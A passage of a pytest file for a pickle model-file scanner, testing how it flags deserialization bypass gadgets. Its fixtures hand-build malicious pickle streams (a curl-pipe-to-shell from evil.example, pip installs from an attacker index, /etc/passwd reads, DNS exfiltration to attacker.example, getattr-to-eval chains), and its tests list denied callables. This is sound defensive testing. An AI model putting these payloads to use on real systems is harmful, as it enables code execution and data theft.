"""Regression tests for re-triage of the MFV pickle *unknown* global bucket.

`_classify_pickle_global` sorts every resolved `module.name` into denied /
allowed / unknown. Denied produces `MFV-PICKLE-001`/CRITICAL. Unknown used to
produce `MFV-PICKLE-004`/INFO unconditionally, with a message calling it
"likely a legitimate custom class".

That is where every publicly documented picklescan bypass gadget lands, by
construction -- a bypass is precisely a callable nobody put on a deny list:

  - `torch.utils.collect_env.run`      CVE-2025-71350
  - `pip.main`                          CVE-2025-1716
  - `linecache` / `ssl` DNS exfil       CVE-2025-46417
  - `builtins.getattr` / `operator.attrgetter` gadget chains

So the working bypasses were all being filed in the tier triagers suppress.
The allow/deny/unknown split was doing its job; the severity assignment was
discarding the result. `_triage_unknown_pickle_global` now re-triages the
bucket against the argument-level evidence the opcode walk already resolves,
emitting `MFV-PICKLE-005` above INFO when the evidence supports it.

The tests below pin both directions: each CVE gadget must escalate, and the
benign shapes that dominate real model files (custom classes, pickled
datetimes, tensor storages) must stay at INFO or lower. The second half is
load-bearing -- an escalation rule that fires on every model file with a
custom class in it is not usable, and "escalate when the global is actually
invoked" fails exactly that way, since a benign `mypackage.MyModel()` is a
resolved call just like a gadget is.
"""

from __future__ import annotations

import array
import datetime
import decimal
import fractions
import functools
import pathlib
import pickle
import re
import uuid

import pytest

from hayward.findings import Severity
from hayward.scanner import (
    ModelFileScanner,
    _classify_pickle_global,
    _pickle_source_denied_target,
    _resolve_pickle_globals,
)

# ── Fixture builders ────────────────────────────────────────────────
#
# The gadgets are hand-assembled rather than produced with pickle.dumps():
# these callables must NOT be imported or executed by the test suite, and
# several of the modules involved (pip, torch) aren't installed here anyway.
# Hand-assembly is also what a real attacker does -- nothing about a malicious
# stream is bound by what a real Pickler would emit.

def _short_binunicode(text: str) -> bytes:
    raw = text.encode()
    assert len(raw) < 256, "fixture string too long for SHORT_BINUNICODE"
    return bytes([0x8C, len(raw)]) + raw


def _reduce_stream(module: str, name: str, packed_args: bytes) -> bytes:
    """Protocol-4 stream: STACK_GLOBAL(module, name), push `packed_args`,
    REDUCE, STOP."""
    return (
        b"\x80\x04"
        + _short_binunicode(module)
        + _short_binunicode(name)
        + b"\x93"           # STACK_GLOBAL
        + packed_args
        + b"R"              # REDUCE
        + b"."              # STOP
    )


def _collect_env_run_bytes() -> bytes:
    """CVE-2025-71350: torch.utils.collect_env.run() is a thin subprocess
    wrapper reachable from the torch namespace, on no deny list."""
    return _reduce_stream(
        "torch.utils.collect_env", "run",
        _short_binunicode("curl http://evil.example/x.sh | sh") + b"\x85",  # TUPLE1
    )


def _pip_main_bytes() -> bytes:
    """CVE-2025-1716: pip.main() installs an attacker-controlled package from
    an attacker-controlled index at load time."""
    return _reduce_stream(
        "pip", "main",
        b"]("                                        # EMPTY_LIST, MARK
        + _short_binunicode("install")
        + _short_binunicode("--index-url")
        + _short_binunicode("http://evil.example/pypi")
        + _short_binunicode("evilpkg")
        + b"e"                                        # APPENDS
        + b"\x85",                                    # TUPLE1
    )


def _linecache_bytes() -> bytes:
    """CVE-2025-46417 (file-read half): linecache reads an arbitrary file,
    the first stage of the read-then-exfiltrate chain."""
    return _reduce_stream(
        "linecache", "getline",
        _short_binunicode("/etc/passwd") + b"K\x01" + b"\x86",  # BININT1 1, TUPLE2
    )


def _ssl_exfil_bytes() -> bytes:
    """CVE-2025-46417 (exfiltration half): ssl.get_server_certificate() takes
    a (host, port) pair, so the hostname is an outbound DNS channel for
    whatever was just read."""
    return _reduce_stream(
        "ssl", "get_server_certificate",
        _short_binunicode("exfil-data.attacker.example")
        + b"M\xbb\x01"     # BININT2 443
        + b"\x86"          # TUPLE2 -> ('exfil-data.attacker.example', 443)
        + b"\x85",         # TUPLE1 -> (that pair,)
    )


def _attrgetter_bytes() -> bytes:
    """operator.attrgetter('system') -- a gadget-chain primitive that keeps
    the denied name `os.system` out of the opcode stream entirely, so a deny
    list has nothing to match on."""
    return _reduce_stream(
        "operator", "attrgetter",
        _short_binunicode("system") + b"\x85",
    )


def _getattr_bytes() -> bytes:
    """builtins.getattr(os.path, 'system') -- the other half of the same
    dynamic-resolution trick."""
    return (
        b"\x80\x04"
        + _short_binunicode("builtins") + _short_binunicode("getattr") + b"\x93"
        + _short_binunicode("mypackage.helpers") + _short_binunicode("mod") + b"\x93"
        + _short_binunicode("system")
        + b"\x86"          # TUPLE2
        + b"R."            # REDUCE, STOP
    )


class _BenignCustomClass:
    """The shape that dominates real model files: an unrecognized global that
    is genuinely a user's own class, constructed with no arguments."""


def _scan(tmp_path, name: str, data: bytes):
    path = tmp_path / name
    path.write_bytes(data)
    return ModelFileScanner().scan_file(path)


def _triaged(findings):
    return [f for f in findings if f.rule_id == "MFV-PICKLE-005"]


def _info(findings):
    return [f for f in findings if f.rule_id == "MFV-PICKLE-004"]


# ── The premise: these all really are unknown ───────────────────────

class TestGadgetsLandInTheUnknownBucket:
    @pytest.mark.parametrize("ref", [
        "linecache.getline",
        "operator.attrgetter",
        "builtins.getattr",
    ])
    def test_gadget_is_on_neither_list(self, ref):
        """These gadgets are on neither the allow nor the deny list, which is
        the premise the whole re-triage rests on. Note what is *not* in this
        list any more: `torch.utils.collect_env.run` was moved onto the deny
        list when this scanner's list was reconciled against picklescan's published
        set (see TestPublishedGadgetsAreDenied). Evidence-based triage answers
        the gadget nobody has published yet; it is not a reason to leave a
        published one unlisted."""
        assert _classify_pickle_global(ref) == "unknown"

    @pytest.mark.parametrize("ref", [
        "operator.attrgetter",
        "operator.itemgetter",
        "operator.methodcaller",
        "builtins.getattr",
        "functools.partial",
    ])
    def test_dual_use_primitives_are_deliberately_not_denied(self, ref):
        """picklescan denies all of these outright. Hayward does not, on purpose:
        they are genuinely common in legitimate pickles, and the re-triage
        reports the chains they enable at MEDIUM with the reason attached,
        which is more precise than a flat CRITICAL. Changing this is a
        precision decision, not a bug fix."""
        assert _classify_pickle_global(ref) == "unknown"


class TestPublishedGadgetsAreDenied:
    """A deny list cannot be complete, which is why the re-triage below it
    exists -- but that is no excuse for missing gadgets that are already
    documented. This list was 51 names behind picklescan's, and every one
    of them sat in the suppressed INFO bucket when referenced without an
    attack-shaped argument.

    cloudpickle is the case that shows why the argument-evidence tier cannot
    substitute for names here: its payload argument is marshalled bytecode,
    not a command string or a URL, so no argument heuristic will ever fire on
    it. Only the callable's name identifies it.
    """

    @pytest.mark.parametrize("ref", [
        # module-wildcard tier
        "httplib.HTTPSConnection",
        "aiohttp.client.ClientSession",
        "sys.exit",
        "pickle.loads",
        "_pickle.loads",
        "bdb.Bdb.run",
        "pip.main",
        "pydoc.pipepager",
        "ssl.get_server_certificate",
        "socket.socket",
        # explicit names
        "cloudpickle.cloudpickle._make_function",
        "cloudpickle.cloudpickle.subimport",
        "types.CodeType",
        "pkgutil.resolve_name",
        "ensurepip._run_pip",
        "doctest.debug_script",
        "code.InteractiveInterpreter.runcode",
        "torch.serialization.load",
        "torch.utils.collect_env.run",
        "torch._inductor.codecache.compile_file",
        "torch.jit.unsupported_tensor_ops.execWrapper",
        "_io.FileIO",
        "logging.FileHandler",
        "imaplib.IMAP4_stream",
        "builtins.open",
        "idlelib.run.Executive.runcode",
    ])
    def test_published_gadget_is_denied(self, ref):
        assert _classify_pickle_global(ref) == "denied"

    @pytest.mark.parametrize("ref", [
        "pickletools.dis",          # not `pickle`
        "ossaudiodev.open",         # not `os`
        "systemd.daemon",           # not `sys`
        "testfixtures.compare",     # not `test`
        "pipeline.Model",           # not `pip`
        "socketserver_custom.X",    # not `socket`
        "uuid.UUID",                # deliberately excluded from the wildcards
    ])
    def test_module_wildcards_respect_component_boundaries(self, ref):
        """A wholly-denied module is matched on dotted-component boundaries,
        never as a bare string prefix. `pip` must not swallow `pipeline`, and
        `uuid` is excluded outright because `uuid.UUID` is an ordinary pickled
        value and the one wildcard with a demonstrated false positive."""
        assert _classify_pickle_global(ref) != "denied"

    def test_cloudpickle_payload_is_critical_without_argument_evidence(self, tmp_path):
        """The end-to-end case for keeping a deny list: a bare reference with
        no resolvable literal argument at all still produces CRITICAL."""
        data = _reduce_stream("cloudpickle.cloudpickle", "_make_function", b")")

        findings = _scan(tmp_path, "cloudpickle_payload.pkl", data)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        ), f"{[(f.rule_id, f.severity) for f in findings]}"


# ── Escalation ──────────────────────────────────────────────────────

class TestUnknownGlobalEscalation:
    def test_collect_env_run_is_now_denied_outright(self, tmp_path):
        """CVE-2025-71350. This case originally demonstrated the re-triage,
        escalating to HIGH on its URL-shaped argument. It now resolves one tier
        higher because the callable was added to the deny list during the
        reconciliation against picklescan's published set -- a strictly
        stronger verdict that no longer depends on the argument being
        resolvable. The remaining CVE gadgets below still exercise the
        evidence path."""
        findings = _scan(tmp_path, "collect_env.pt", _collect_env_run_bytes())

        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert denied, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert denied[0].severity == Severity.CRITICAL
        assert "torch.utils.collect_env.run" in denied[0].message
        assert "curl http://evil.example/x.sh | sh" in denied[0].message
        assert not _info(findings)

    def test_pip_main_is_now_denied_by_the_module_tier(self, tmp_path):
        """CVE-2025-1716. Originally demonstrated the re-triage, escalating to
        HIGH on the attacker index URL inside a list argument. `pip` is now a
        wholly-denied module, so this resolves one tier higher and no longer
        depends on the URL being resolvable at all."""
        findings = _scan(tmp_path, "pip_main.pkl", _pip_main_bytes())

        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert denied, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert denied[0].severity == Severity.CRITICAL
        assert "pip.main" in denied[0].message

    def test_third_party_callable_with_url_argument_escalates_to_high(self, tmp_path):
        """The URL-argument signal itself, tested against a callable that is
        unknown *by construction* rather than one that merely happens to be
        unlisted today. Every CVE gadget originally used here has since moved
        onto the deny list, which kept invalidating this test; a fictional
        third-party module cannot."""
        data = _reduce_stream(
            "mypackage.updater", "fetch",
            _short_binunicode("http://evil.example/payload") + b"\x85",
        )
        findings = _scan(tmp_path, "third_party_url.pkl", data)

        triaged = _triaged(findings)
        assert triaged, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.HIGH
        assert "mypackage.updater.fetch" in triaged[0].message

    def test_ssl_exfiltration_is_now_denied_by_the_module_tier(self, tmp_path):
        """CVE-2025-46417, exfiltration half. `ssl` is a wholly-denied module
        now, so the (host, port) structural signal is no longer what carries
        this one."""
        findings = _scan(tmp_path, "ssl_exfil.pkl", _ssl_exfil_bytes())

        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert denied, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert denied[0].severity == Severity.CRITICAL

    def test_host_port_signal_still_works_on_an_unknown_callable(self, tmp_path):
        """The structural (hostname, port) signal itself, on a callable that
        stays unknown."""
        data = _reduce_stream(
            "mypackage.telemetry", "send",
            _short_binunicode("exfil-data.attacker.example")
            + b"M\xbb\x01" + b"\x86" + b"\x85",
        )
        findings = _scan(tmp_path, "third_party_hostport.pkl", data)

        triaged = _triaged(findings)
        assert triaged, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.HIGH
        assert "network endpoint" in str(triaged[0].metadata["triage"])

    def test_linecache_file_read_escalates_to_low(self, tmp_path):
        """CVE-2025-46417, file-read half. A path argument is real evidence
        but weak: it is a file read, not code execution, and it is
        indistinguishable at the opcode level from a legitimately pickled
        `pathlib` object. LOW clears the suppressed INFO tier without
        overstating the finding. The exfiltration half of the same CVE chain
        is what lands at HIGH (see the ssl case)."""
        findings = _scan(tmp_path, "linecache.pkl", _linecache_bytes())

        triaged = _triaged(findings)
        assert triaged, f"expected MFV-PICKLE-005, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.LOW
        assert triaged[0].severity != Severity.INFO
        assert "linecache.getline" in triaged[0].message
        assert "/etc/passwd" in triaged[0].message

    def test_attrgetter_on_denied_attribute_name_escalates_to_medium(self, tmp_path):
        """`attrgetter('system')` never puts `os.system` in the stream, so a
        deny list sees nothing. The literal argument matching the attribute
        name of an already-denied callable is what gives it away."""
        findings = _scan(tmp_path, "attrgetter.pkl", _attrgetter_bytes())

        triaged = _triaged(findings)
        assert triaged, f"expected MFV-PICKLE-005, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.MEDIUM
        assert "operator.attrgetter" in triaged[0].message
        assert "getattr/attrgetter chain" in triaged[0].message

    @pytest.mark.parametrize("attr", ["eval", "exec", "system", "popen", "fork", "spawn"])
    def test_short_code_execution_attribute_names_escalate(self, tmp_path, attr):
        """`getattr(module, "eval")` is the chaining technique Slaviero
        documented in 2011. The denied-attribute-name set originally kept only
        dunders and names of 6+ characters, on the theory that short names read
        as ordinary English -- which dropped `eval`, `exec`, `popen`, `fork`
        and `spawn`, i.e. precisely the canonical targets. Length is no longer
        the test."""
        data = _reduce_stream("operator", "attrgetter", _short_binunicode(attr) + b"\x85")

        findings = _scan(tmp_path, f"attrgetter_{attr}.pkl", data)
        triaged = _triaged(findings)
        assert triaged, f"attrgetter({attr!r}) stayed at INFO: {[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.MEDIUM

    @pytest.mark.parametrize("attr", ["run", "call", "get", "load", "open", "apply"])
    def test_generic_attribute_names_stay_quiet(self, tmp_path, attr):
        """The other half of dropping the length rule: these are ordinary
        vocabulary that plausibly appears as a literal in real model metadata
        (a stage name, a mode, a config value), so they must not fire even
        though each is the attribute name of some denied global."""
        data = _reduce_stream("mypackage.stage", "Runner", _short_binunicode(attr) + b"\x85")

        findings = _scan(tmp_path, f"runner_{attr}.pkl", data)
        assert not _triaged(findings), (
            f"Runner({attr!r}) escalated on an ordinary word: "
            f"{[(f.severity, f.message) for f in _triaged(findings)]}"
        )

    def test_dynamic_resolution_chain_through_an_opaque_argument(self, tmp_path):
        """DEF-45. The canonical chain Slaviero documented in 2011:
        `getattr(globals(), "eval")`. `globals()` is a REDUCE result and so
        opaque, which used to make the *whole* call site unrecordable --
        throwing away the `"eval"` literal that is the entire point of the
        chain, and leaving the file at suppressed INFO.

        Requiring every argument to resolve is still the rule for `args`; it
        is what keeps a fabricated value out of a finding. But the literal
        text that genuinely is present is now kept separately."""
        chain = (
            b"c__builtin__\ngetattr\n"
            b"("                          # MARK for getattr's arguments
            b"c__builtin__\nglobals\n"
            b"(t"                         # MARK + TUPLE -> ()
            b"R"                          # globals() -> opaque
            b"S'eval'\n"
            b"t"                          # TUPLE -> (<opaque>, 'eval')
            b"R"                          # getattr(<opaque>, 'eval')
            b"."
        )
        findings = _scan(tmp_path, "getattr_globals_eval.pkl", chain)

        triaged = _triaged(findings)
        assert triaged, f"chain stayed at INFO: {[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.MEDIUM
        assert "__builtin__.getattr" in triaged[0].message
        assert "eval" in triaged[0].message

    def test_partial_call_is_rendered_as_partial(self, tmp_path):
        """The render must never let a partially-resolved call be misread as
        a complete one. Ellipses stand in for the arguments that did not
        resolve, and no value is invented for them."""
        chain = (
            b"c__builtin__\ngetattr\n"
            b"(" b"c__builtin__\nglobals\n" b"(t" b"R"
            b"S'eval'\n" b"t" b"R" b"."
        )
        _globals_found, calls, _memo = _resolve_pickle_globals(chain)
        partial = [c for c in calls if c.ref == "__builtin__.getattr"]
        assert partial, "the chained call was not recorded at all"

        rendered = partial[0].format()
        assert rendered == "__builtin__.getattr(... 'eval' ...)", rendered
        # args must stay empty: nothing about the opaque argument is known.
        assert partial[0].args == ()
        assert partial[0].partial_texts == ("eval",)

    def test_fully_resolved_calls_are_unaffected(self, tmp_path):
        """The partial path must not change how a normal call is recorded."""
        data = _reduce_stream("pip", "main", _short_binunicode("http://evil.example/p") + b"\x85")

        _globals_found, calls, _memo = _resolve_pickle_globals(data)
        assert calls[0].partial_texts == ()
        assert calls[0].args == ("http://evil.example/p",)
        assert calls[0].format() == "pip.main('http://evil.example/p')"

    def test_partial_call_with_no_literal_text_records_nothing(self):
        """No evidence means no record. A call whose arguments are entirely
        opaque (a persistent-ID lookup, not a call result) must not produce
        an empty partial entry that would render as a bare no-argument call.
        A *call result* argument is different: that is chain evidence, and
        it is recorded now (see the intermediary-chain test below)."""
        data = (
            b"\x80\x04"
            + _short_binunicode("mypackage") + _short_binunicode("Thing") + b"\x93"
            + _short_binunicode("storage-key") + b"Q"   # BINPERSID -> opaque
            + b"\x85"                  # TUPLE1 -> (<opaque>,)
            + b"R."
        )
        _globals_found, calls, _memo = _resolve_pickle_globals(data)
        thing_calls = [c for c in calls if c.ref == "mypackage.Thing"]
        assert thing_calls == [], f"recorded a no-evidence partial: {thing_calls}"

    def test_getattr_chain_escalates_to_medium(self, tmp_path):
        """Same trick via builtins.getattr, whose second argument carries the
        denied attribute name."""
        findings = _scan(tmp_path, "getattr.pkl", _getattr_bytes())

        triaged = _triaged(findings)
        assert triaged, f"expected MFV-PICKLE-005, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert triaged[0].severity == Severity.MEDIUM
        assert "builtins.getattr" in triaged[0].message

    def test_escalated_finding_carries_structured_triage_evidence(self, tmp_path):
        """Metadata must explain *why* it escalated, so a triager can judge
        the call without re-deriving it from the message text."""
        data = _reduce_stream(
            "mypackage.updater", "fetch",
            _short_binunicode("http://evil.example/pypi") + b"\x85",
        )
        findings = _scan(tmp_path, "third_party_url.pkl", data)

        triage = _triaged(findings)[0].metadata["triage"]
        entry = triage["mypackage.updater.fetch"]
        assert entry["severity"] == "high"
        assert entry["confidence"] == pytest.approx(0.70)
        assert "URL" in entry["reason"]
        assert "http://evil.example/pypi" in entry["call"]

    def test_every_cve_gadget_clears_the_suppressed_info_tier(self, tmp_path):
        """The whole point, stated once against all six gadgets: none of them
        may be reported at INFO, which is the tier triagers suppress and the
        tier all of them used to land in.

        Deliberately agnostic about *which* mechanism catches each one. The
        deny list handles collect_env.run and the argument-evidence tier
        handles the rest; both are acceptable answers, and pinning the
        mechanism here would make this test fail every time a gadget is
        promoted from one to the other."""
        gadgets = {
            "torch.utils.collect_env.run": _collect_env_run_bytes(),
            "pip.main": _pip_main_bytes(),
            "linecache.getline": _linecache_bytes(),
            "ssl.get_server_certificate": _ssl_exfil_bytes(),
            "operator.attrgetter": _attrgetter_bytes(),
            "builtins.getattr": _getattr_bytes(),
        }
        for ref, data in gadgets.items():
            findings = _scan(tmp_path, f"{ref.replace('.', '_')}.pkl", data)

            actionable = [f for f in findings if f.severity != Severity.INFO]
            assert actionable, (
                f"{ref} produced nothing above INFO: "
                f"{[(f.rule_id, f.severity) for f in findings]}"
            )
            assert any(ref in f.message for f in actionable), (
                f"{ref} was not named in any actionable finding"
            )
            # The gadget itself must be out of the INFO catch-all. Other
            # globals in the same stream may legitimately remain there --
            # `os.path` in the getattr chain is only ever *referenced*, so
            # there is no call evidence to triage it on.
            for finding in _info(findings):
                assert ref not in finding.metadata["unknown_globals"], ref


# ── Non-escalation: the benign shapes that must stay quiet ──────────

class TestBenignUnknownGlobalsStayAtInfo:
    def test_custom_class_construction_stays_at_info(self, tmp_path):
        """The single most important negative case. A user's own class is an
        unknown global AND a resolved call with literal (empty) arguments, so
        "escalate anything that is invoked" would fire on nearly every real
        model file. Only argument evidence or capability-surface membership
        escalates, and this has neither."""
        data = pickle.dumps(_BenignCustomClass(), protocol=4)

        _globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        # Sanity-check the trap actually exists: this benign class *is*
        # recorded as an invoked call, indistinguishable from a gadget on
        # that axis alone.
        assert any(c.ref.endswith("_BenignCustomClass") for c in resolved_calls)

        findings = _scan(tmp_path, "custom_class.pkl", data)
        assert not _triaged(findings)
        assert _info(findings) and _info(findings)[0].severity == Severity.INFO

    @pytest.mark.parametrize("label, obj", [
        ("datetime", datetime.datetime(2026, 8, 2, 12, 30)),
        ("date", datetime.date(2026, 8, 2)),
        ("timedelta", datetime.timedelta(days=3, seconds=42)),
        ("decimal", decimal.Decimal("3.14159")),
        ("uuid", uuid.UUID("12345678-1234-5678-1234-567812345678")),
        ("fraction", fractions.Fraction(3, 7)),
        ("array", array.array("d", [1.0, 2.0, 3.0])),
        ("regex", re.compile(r"^a|b")),
        ("partial", functools.partial(int, base=16)),
        ("relative_path", pathlib.PurePosixPath("models/x.bin")),
        ("nested_config", {"cfg": {"lr": 0.01, "name": "gpt2", "tags": ["a", "b"]}}),
    ])
    def test_ordinary_stdlib_data_types_do_not_escalate(self, tmp_path, label, obj):
        """These are all unrecognized stdlib globals that ordinary pickles
        construct constantly. They are the measured reason the "root module is
        stdlib, therefore suspicious" tier was dropped: it fired on every one
        of them while catching nothing the argument signals missed. The
        stdlib is where the gadgets live *and* where the ordinary data types
        live, so module identity cannot separate them."""
        data = pickle.dumps(obj, protocol=4)

        findings = _scan(tmp_path, f"{label}.pkl", data)
        assert not _triaged(findings), (
            f"{label} escalated on module identity alone: "
            f"{[(f.severity, f.message) for f in _triaged(findings)]}"
        )

    def test_pickled_datetime_binary_blob_does_not_escalate_to_high(self, tmp_path):
        """datetime pickles its state as a packed binary blob full of bytes
        that happen to be shell metacharacters. Decoding those as text and
        pattern-matching would make every pickled datetime a HIGH finding;
        the printable-ASCII gate is what prevents it."""
        data = pickle.dumps(datetime.datetime(2026, 8, 2, 12, 30, 45), protocol=4)

        findings = _scan(tmp_path, "datetime.pkl", data)
        assert not _triaged(findings), (
            f"binary datetime state matched a text pattern: "
            f"{[(f.severity, f.message) for f in _triaged(findings)]}"
        )

    def test_benign_string_with_metacharacter_is_not_a_command(self, tmp_path):
        """A separator-joined config value like `a;b;c` is not a shell
        pipeline. The shell pattern requires the metacharacter to be used as
        an operator, i.e. adjacent to whitespace."""
        data = _reduce_stream(
            "mypackage.config", "Config",
            _short_binunicode("alpha;beta;gamma") + b"\x85",
        )

        findings = _scan(tmp_path, "config.pkl", data)
        assert not _triaged(findings)
        assert _info(findings)

    def test_relative_path_argument_to_third_party_class_stays_at_info(self, tmp_path):
        """Only absolute paths, `~/` and traversal count. A bare relative
        filename is too common in legitimate model metadata to be evidence."""
        data = _reduce_stream(
            "mypackage.tokenizer", "Tokenizer",
            _short_binunicode("vocab.json") + b"\x85",
        )

        findings = _scan(tmp_path, "tokenizer.pkl", data)
        assert not _triaged(findings)
        assert _info(findings)

    def test_denied_global_still_wins_and_suppresses_the_unknown_bucket(self, tmp_path):
        """An actual denied callable is still CRITICAL/MFV-PICKLE-001, and
        re-triage must not add noise alongside it."""
        data = _reduce_stream("os", "system", _short_binunicode("id") + b"\x85")

        findings = _scan(tmp_path, "denied.pkl", data)
        assert any(f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL for f in findings)
        assert not _triaged(findings)
        assert not _info(findings)


# ── Secondary: the torch.* wildcard allowlist ───────────────────────

class TestStorageAllowlistIsBounded:
    @pytest.mark.parametrize("ref", [
        "torch.FloatStorage",
        "torch.BFloat16Storage",
        "torch.LongTensor",
        "torch.cuda.FloatTensor",
        "torch.storage.TypedStorage",
        "torch.storage._TypedStorage",
    ])
    def test_real_storage_classes_stay_allowed(self, ref):
        """The rule exists because these number in the dozens and change
        across torch versions. Tightening it must not break them."""
        assert _classify_pickle_global(ref) == "allowed"

    @pytest.mark.parametrize("ref", [
        "torch.utils.collect_env.SomethingTensor",
        "torch.anything.at.any.depth.EvilStorage",
        "torch.nn.functional.reduceTensor",
    ])
    def test_arbitrary_torch_namespace_depth_is_no_longer_allowlisted(self, ref):
        """The previous rule was `startswith("torch.") and endswith("Storage"
        or "Tensor")` -- a wildcard over an attacker-controlled string that
        waved through any name at any depth of the torch namespace. The
        parent module is now matched exactly."""
        assert _classify_pickle_global(ref) == "unknown"


class TestAllowlistedCallableWithAnomalousArgument:
    """ShadowPickle's "Overwritten Module" variant (arXiv:2607.17503) is
    reported at 63% evasion across ten scanners, with picklescan and ModelScan
    both at 0%. It works by never naming anything dangerous at all.

    The pickle calls `collections.OrderedDict` -- allowlisted here, by
    picklescan, by ModelScan, and by PyTorch's own weights-only unpickler --
    and passes it a string. A trojaned `collections` resident in the victim
    environment (installed through a `.pth` file that rebinds
    `sys.modules["collections"]` at interpreter start) executes it. There is no
    `os`, no `posix`, no `exec` in the stream, so every name-based check passes
    by construction.

    The fix is not another list. An allowlisted *name* is not an allowlisted
    *argument*: a mapping reconstructor has no legitimate use for free text,
    whatever that text says. Deliberately a shape check and not a content
    check, because the published payloads (`ls -la`, multi-line Python source)
    trip none of the URL, shell-metacharacter or leading-path patterns used
    elsewhere, and chasing string contents would be an arms race.
    """

    def _ordereddict_with(self, text: str) -> bytes:
        """The shape from ShadowPickle's released injector: GLOBAL
        collections OrderedDict, a BINUNICODE argument, TUPLE1, REDUCE, BUILD.
        The length prefix is computed rather than hand-written, since getting
        it wrong silently truncates the stream instead of failing loudly."""
        raw = text.encode()
        return (
            b"\x80\x02ccollections\nOrderedDict\n"
            + b"X" + len(raw).to_bytes(4, "little") + raw
            + b"\x85Rb"
        )

    @pytest.mark.parametrize("arg", [
        "ls -la",
        "import os;os.getcwd",
        "if not 'hypervisor' in open('/proc/cpuinfo').read(): pass",
    ])
    def test_allowlisted_constructor_given_a_string_is_reported(self, tmp_path, arg):
        findings = _scan(tmp_path, "shadowpickle.pkl", self._ordereddict_with(arg))

        flagged = [f for f in findings if f.rule_id == "MFV-PICKLE-006"]
        assert flagged, (
            f"allowlisted callable with a string argument was not reported: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert flagged[0].severity == Severity.MEDIUM
        assert "collections.OrderedDict" in flagged[0].message

    @pytest.mark.parametrize("obj", [
        {"layer.weight": [0.1, 0.2]},
        {"cfg": {"name": "gpt2", "lr": 0.01}},
    ])
    def test_ordinary_state_dicts_stay_silent(self, tmp_path, obj):
        """The load-bearing negative. `OrderedDict` and `dict` appear in
        essentially every model file; only a *string argument* is anomalous."""
        import collections as _c

        data = pickle.dumps(_c.OrderedDict(obj), protocol=4)
        findings = _scan(tmp_path, "benign_state_dict.pkl", data)
        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-006"]

    def test_allowlisted_entries_that_do_take_strings_are_exempt(self):
        """`_codecs.encode`, `numpy.dtype` and `torch.serialization._get_layout`
        legitimately receive strings. The exemption is a type contract and is
        complete over the allow list, which is what makes it checkable at all."""
        from hayward.scanner import (
            PickleResolvedCall,
            _allowed_call_has_anomalous_string,
        )

        for ref, arg in [("_codecs.encode", "é"),
                         ("numpy.dtype", "f8"),
                         ("torch.serialization._get_layout", "torch.strided"),
                         ("torch.device", "cuda")]:
            call = PickleResolvedCall(ref, (arg,))
            assert _allowed_call_has_anomalous_string(ref, call) is None, ref

    def test_reconstruct_with_a_string_subtype_is_exempt(self):
        """Protocols 0/1 reduce every ndarray as
        `_reconstruct('numpy.ndarray', shape, dtype)` with the subtype as a
        string. Nine real sklearn models in the quickset benign corpus
        tripped MFV-PICKLE-006 on exactly this call, so the string-argument
        premise is false at the source for it."""
        from hayward.scanner import (
            PickleResolvedCall,
            _allowed_call_has_anomalous_string,
        )

        for ref in ("numpy.core.multiarray._reconstruct",
                    "numpy._core.multiarray._reconstruct"):
            call = PickleResolvedCall(ref, ("numpy.ndarray", (0,), b"b"))
            assert _allowed_call_has_anomalous_string(ref, call) is None, ref
        for ref in ("numpy.core.multiarray.scalar",
                    "numpy._core.multiarray.scalar"):
            call = PickleResolvedCall(ref, ("i8", False, True))
            assert _allowed_call_has_anomalous_string(ref, call) is None, ref

    def test_global_ref_argument_is_not_free_text(self, tmp_path):
        """The hub sweep's biggest FP class (7 files): `defaultdict(int)` and
        `_reconstruct(ndarray, ...)` hand a *class reference* to an
        allowlisted callable, and the ref's string rendering was being read
        as a free-text argument. A global ref is an object, not text."""
        data = (
            b"\x80\x04"
            + _short_binunicode("collections") + _short_binunicode("defaultdict") + b"\x93"
            + _short_binunicode("builtins") + _short_binunicode("int") + b"\x93"
            + b"\x85"                        # TUPLE1 -> (int-ref,)
            + b"R}."
        )
        findings = _scan(tmp_path, "tokenizer-defaultdict.pkl", data)
        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-006"], (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_literal_string_argument_still_flagged(self, tmp_path):
        """The case the check exists for stays: a genuine BINUNICODE literal
        handed to an allowlisted callable (ShadowPickle's shape)."""
        data = (
            b"\x80\x04"
            + _short_binunicode("collections") + _short_binunicode("OrderedDict") + b"\x93"
            + _short_binunicode("ls -la")
            + b"\x85R}."
        )
        findings = _scan(tmp_path, "shadowpickle-literal.pkl", data)
        assert [f for f in findings if f.rule_id == "MFV-PICKLE-006"]

    def test_protocol_0_numpy_pickle_stays_silent(self, tmp_path):
        """End to end: the protocol 0 ndarray reduce (subtype as a string,
        exactly as old numpy emitted it) must not produce an MFV-PICKLE-006
        finding. Bytes hand-written so the test needs no numpy install."""
        data = (
            b"cnumpy.core.multiarray\n_reconstruct\np0\n"
            b"(S'numpy.ndarray'\np1\n(I0\ntS'b'\np2\ntp3\nRp4\n."
        )
        findings = _scan(tmp_path, "legacy_numpy.pkl", data)
        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-006"]


class TestDynamicResolutionByTargetName:
    """PickleCloak (USENIX Security 2026) mines the standard library for
    dotted-name resolvers automatically, so it finds gadgets nobody has
    listed: `logging.config._resolve`, `unittest.mock._dot_lookup`,
    `xmlrpc.server.resolve_dotted_attribute`, `sympy.utilities.source
    .get_class`. A deny list cannot win that race.

    But every one of them is handed the same thing: the string `'os.system'`.
    The resolver is interchangeable; the target is not. Keying on the target
    rather than the resolver is what turns an unwinnable list-maintenance
